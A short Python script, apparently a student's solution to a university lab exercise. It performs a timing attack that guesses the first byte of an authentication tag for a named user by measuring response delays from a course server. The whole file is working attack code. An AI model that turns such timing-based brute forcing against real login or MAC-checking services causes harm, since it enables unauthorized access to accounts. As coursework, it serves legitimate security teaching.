import requests
import time
import concurrent.futures

def request(url):
    start_time = time.time()
    response = requests.get(url)
    end_time = time.time()
    elapsed_time = end_time - start_time

    result = {
        "status_code": response.status_code,
        "elapsed_time": elapsed_time
    }
    return result

def request_with_attributes(delay, user, tag):
    url = f"http://dart.cse.kau.se:12345/auth/{delay}/{user}/{tag}"
    response = request(url)
    elapsed_time = response["elapsed_time"]
    status_code = response["status_code"]
    result = {
        "ok": status_code == 200,
        "elapsed_time": elapsed_time
    }
    return result

def pad_string(input_str, target_length):
    while len(input_str) < target_length:
        input_str += '0'
    return input_str

def pwn(hex_prefix, user, delay):
    hex = pad_string(hex_prefix, 32) # pad string
    result = request_with_attributes(delay, user, hex) # make request
    is_ok = result["ok"]
    elapsed_time = result["elapsed_time"]
    hex_prefix_ok = elapsed_time >= delay

    result = {
        "ok": is_ok,
        "elapsed_time": elapsed_time,
        "hex": hex,
        "hex_prefix": hex_prefix,
        "hex_prefix_ok": hex_prefix_ok
    }
    return result
        

if __name__ == "__main__":
    user = "oscaande104"
    delay = 100
    max_workers = 5
    
    with concurrent.futures.ThreadPoolExecutor(max_workers) as executor:
        results = []
        for hex_int in range(256):
            hex_prefix = format(hex_int, '02x')[::-1] # convert to hex
            results.append(executor.submit(pwn, hex_prefix, user, delay))
        
        for feature in concurrent.futures.as_completed(results):
            result = feature.result()
            print(result)
            if result["ok"]:
                print(f"Success hex={result['hex']}")
                exit()
            elif result["hex_prefix_ok"]:
                break
